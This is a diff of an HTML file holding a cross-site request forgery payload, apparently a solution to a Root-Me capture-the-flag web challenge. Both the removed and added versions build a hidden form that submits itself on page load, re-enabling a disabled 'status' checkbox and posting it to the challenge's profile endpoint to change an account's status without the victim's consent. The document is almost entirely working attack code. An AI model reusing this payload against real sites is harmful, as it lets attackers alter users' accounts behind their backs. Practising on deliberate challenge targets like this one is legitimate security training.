@@ -1,16 +1,32 @@
-<form action="http://challenge01.root-me.org/web-client/ch22/index.php?action=profile" method="POST" enctype="multipart/form-data">
-    <input type="text" name="username" value="jeje">
-    <input type="checkbox" name="status"/>
-</form>
-<script>
-    document.addEventListener("DOMContentLoaded", function() {
-        let checkbox = document.querySelector('input[name="status"]');
-        
-        if (checkbox) {  // Vérifie que le checkbox existe
-            checkbox.removeAttribute("disabled"); // Supprime l'attribut "disabled" s'il est présent
-            checkbox.checked = true; // Coche la case
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CSRF Attack</title>
+    <script type="text/javascript">
+        // Fonction pour activer la case "Status" et soumettre le formulaire
+        function submitForm() {
+            // Active la case à cocher 'status'
+            document.getElementById("status").disabled = false; 
+            // Soumet le formulaire
+            document.getElementById("csrfForm").submit();
         }
-
-        document.forms[0].submit(); // Soumet le formulaire automatiquement
-    });
-</script>
+    </script>
+</head>
+<body onload="submitForm();">
+    <form id="csrfForm" action="?action=profile" method="post" enctype="multipart/form-data">
+        <div class="form-group">
+            <label>Username:</label>
+            <input type="text" name="username" value="jeje">
+        </div>
+        <br>        
+        <div class="form-group">
+            <label>Status:</label>
+            <!-- La case est initialement désactivée, mais sera activée par le script -->
+            <input type="checkbox" id="status" name="status">
+        </div>
+        <br>    
+    </form>
+</body>
+</html>
